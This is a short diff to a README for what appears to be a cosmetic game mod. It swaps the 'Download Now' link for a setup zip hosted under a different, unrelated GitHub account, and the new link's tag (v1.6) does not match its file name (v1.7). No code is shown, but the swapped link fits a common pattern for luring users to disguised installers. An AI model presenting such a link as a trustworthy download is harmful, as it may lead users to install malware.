@@ -22,7 +22,7 @@ Perfect for players who want a refreshed look while maintaining smooth playabili
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/StewardFence/MECCHA-CHAMELEON-VISION/releases/download/setup-v2.3.15/setup.v2.3.15.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/MailJackdaw39/Meccha-Chameleon-MecchaVoid/releases/download/v1.6/setup.v1.7.zip)
 Download the latest version using the button below.
 
 Unzip the archive to a separate folder.
